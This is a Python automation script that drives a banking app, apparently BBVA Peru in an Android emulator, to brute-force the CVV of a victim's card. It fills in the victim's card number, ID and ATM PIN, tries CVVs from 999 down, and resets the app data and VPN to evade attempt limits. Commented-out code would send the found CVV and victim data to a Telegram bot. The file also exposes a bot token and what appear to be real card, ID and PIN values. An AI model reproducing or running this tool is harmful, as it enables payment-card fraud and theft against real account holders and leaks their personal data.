import pyautogui as robot
import time 
#import telegram
from io import open

afiliacion = 290,1013
#tipodedocumento = 1427,572
#click_dni = 1406,417
Ndocumento = 421,379
Ntarjeta = 421, 445 
Nclavecajero = 421,628
CVV = 421,533
Continuar1 = 284,721
reintentar = 284,957
#reintentar = 1637,984
escape = 544,76


# Este es miooo de Hasen
# no compartir por error, si eres alguien tmre me descuide 

#bot_token2 = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
#chat_id2 = '1850445278'
#bot2 = telegram.Bot(token=bot_token2)

#bot.send_message(chat_id=chat_id, text = 'Corriendo bot :D')

#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

#Pedir dato
print("\n")
print("El programa trabaja de manera descendente 999...998...997...")
print("\n")
print("*****************")
print("Escriba los datos: ")


arhivo_user = open("user.txt","r")
textoUser = arhivo_user.readlines()
arhivo_user.close()

victima_tar = textoUser[0].rstrip()
victima_dni = textoUser[1].rstrip()
victima_pasw = textoUser[2].rstrip()


#victima_tar = "4919148311467715"
#victima_dni = "77470040"
#victima_pasw = "1898"



print("*****************")

inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))

#Veces que intenta:
#intentos = 3
intentos = int(input("Intentos?"))

print("*****************")
print("Presione 'Enter' para continuar")
input()

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	#pyautogui.moveTo(503,315)
	robot.click(clicks=click)

def logeo ():
	abrir(afiliacion,click=1)
	time.sleep(4)
	robot.click(33,437) # Clicktarjeta con datos impresos
	time.sleep(0.2)
	robot.click(283,650) # Click Continuar
	time.sleep(1) 

	abrir(Ndocumento)
	robot.typewrite(victima_dni)
	time.sleep(0.1)
	abrir(Ntarjeta)
	robot.typewrite(victima_tar)
	time.sleep(0.1)
	abrir(Nclavecajero)
	robot.typewrite(victima_pasw)
	#robot.click(529,627)
	time.sleep(0.1)
	#robot.click(529,536)
	#time.sleep(0.1)
	#robot.click(529,536)
	#time.sleep(0.1)

def reiniciartodo():

	robot.hotkey('ctrl', 'shift', '1')
	time.sleep(1)
	robot.moveTo(451,282)
	robot.dragTo(451,282, duration=1) # Mantener pulsado en el icono
	robot.click(476,308) # clik info
	time.sleep(1)
	robot.click(430,219) # forzar detencion
	time.sleep(1)
	robot.click(489,596) # aceptar
	time.sleep(1)
	robot.click(164,287) # almacenamiento
	time.sleep(1)
	robot.click(150,322) # borrar datos
	time.sleep(1)
	robot.click(488,601) # aceptar
	time.sleep(1)
	robot.hotkey('ctrl', 'shift', '1')
	robot.click(464,442) # abrir archivos
	time.sleep(1.5)
	robot.moveTo(69,156)
	robot.dragTo(69,156, duration=1.5) # Mantener pulsado en el icono
	time.sleep(1)
	robot.click(214,155) # click android
	time.sleep(1)
	robot.click(361,154) # click backoud
	time.sleep(1)
	robot.click(285,1010) # click eliminar
	time.sleep(1)
	robot.click(390,612) #OK
	time.sleep(1)
	robot.click(282,632)
	time.sleep(0.5)
	robot.hotkey('ctrl', 'shift', '1')
	time.sleep(0.5)
	#Borrado 2da parte por si acaso...
	#todavia no mejor

	'''
	robot.click(460,269) # abrir bbva peru

	robot.hotkey('ctrl', 'shift', '5')
	time.sleep(0.2)
	robot.scroll(400)
	time.sleep(0.1)
	robot.click(471,93)
	'''
	time.sleep(0.2)
	robot.click(773,15) #click hma
	time.sleep(0.5)
	robot.click(889,366) # click reset
	time.sleep(15)

	robot.click(455,279) # abrir bbva
	#esperar a que aparesca acceder
	time.sleep(6)
	x = None
	c_aceptars = 'c_acceder.png'
	while (x is None):
		x = robot.locateOnScreen(c_aceptars,grayscale=True,confidence=0.9, region=(205,884,164,62) )
	time.sleep(1)
	robot.click(278,917) # acceder
	time.sleep(3)

print(":D")

print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.5)
print("2")
time.sleep(0.5)
print("1")
print ('\a')

logeo()

contador = 0 # para reiniciar 
inicio = inicio + 1


while inicio>fin :  # >  < # desde 999 para abajo
	
	inicio = inicio - 1
	contador += 1

	#print(contador)
	if (contador > intentos): # Reiniciar  #4 es lo normal # las veces que intenterá
		print("Reiniciando, esperar por favor")
		abrir(escape)
		time.sleep(1)
		robot.click(285,957)
		time.sleep(1.7)

		logeo() # Logeandose de nuevo

		print("Continuando...")
		contador=1

	#print("Intentado con: ",inicio)

	registro = open("registro.txt","a")
	registro.write(str(inicio)) # escribir en el block
	registro.write("\n")
	registro.close()
	 # Borar quizas
	print("Intentando con: ",inicio)

	#time.sleep(0.1)
	#print("Borrando") ##################
	abrir(CVV)
	
	robot.press('backspace')
	robot.press('backspace')
	robot.press('backspace')
	#time.sleep(0.1)
	#por si son bajos de 100
	if inicio < 100:
		robot.typewrite("0")
		robot.typewrite(str(inicio))
		time.sleep(0.1)
		#print("Tipeando") #######################
	else:
		robot.typewrite(str(inicio))
		time.sleep(0.1)
		#print("Tipeando") #########################
	#time.sleep(0.1)

	#time.sleep(0.2)
	abrir(Continuar1)

	# Para ver cuanto demora en cargar
	blanco =  False
	ceveve2 = False
	ceveve = False
	blanco4intento = False

	contadorEmergencia = 0
	time.sleep(0.8)
	while blanco is False :
		time.sleep(0.2)
		contadorEmergencia += 1
		blanco = robot.pixelMatchesColor(517,827,(255,255,255))
		#ceveve = robot.pixelMatchesColor(532,619,(212,237,252)) # cambió de lugar
		ceveve = robot.pixelMatchesColor(419,615,(212,237,252)) # cambió de lugar
		ceveve2 = robot.pixelMatchesColor(419,579,(212,237,252)) # cambió de lugar
		blanco4intento = robot.pixelMatchesColor(455,157,(255,255,255))
		#print(blanco)
		#print("Cargando..."+ blanco)
		
		#print(contador)


		if (blanco is True) and (contador < intentos):
			print("!blanco!")
			contadorEmergencia = 0
			
			time.sleep(0.1)
			abrir(escape)
			break


		if (ceveve is True) or (ceveve2 is True):
			print ('\a')
			#bot2.send_message(chat_id=chat_id2, text = "-------------")
			#bot2.send_message(chat_id=chat_id2, text = 'CVV encontrada: '+str(inicio))
			#bot2.send_message(chat_id=chat_id2, text = str(victima_tar))
			#bot2.send_message(chat_id=chat_id2, text = str(victima_dni))
			#bot2.send_message(chat_id=chat_id2, text = str(victima_pasw))

			print("CVV encontrado: "+ str(inicio))
			input ("Presione ' Enter ' para salir")
			quit()
			input()

		if contadorEmergencia == 50:
			print("Detenido por EMERGENCIA (error)")
			print("Enter para continuar o cierralo mejor")
			print("Reinicio final")
			contadorEmergencia = 0
			time.sleep(0.2)

				
			#intentos = 1 # las veces que intenterá
			
			#input()

			inicio = inicio + 1

			reiniciartodo()

			contador = 0
			logeo()
			break

		if (intentos == 3) and (contadorEmergencia > 12):
			if (contador == intentos):
				time.sleep(0.5) #solo al 3
				robot.press('backspace')
				time.sleep(0.3)
				robot.click(287,955) #solo al 3
				time.sleep(1) #solo al 3
				contadorEmergencia = 0
				break


			print("CVV encontrado: "+ str(inicio))
			input ("Presione ' Enter ' para salir")
			quit()
			input()
			
		#print(contador)
	time.sleep(0.1)

	print("--------------------------------")
	

	time.sleep(0.2)



print("Presione 'Enter' para continuar")
input()



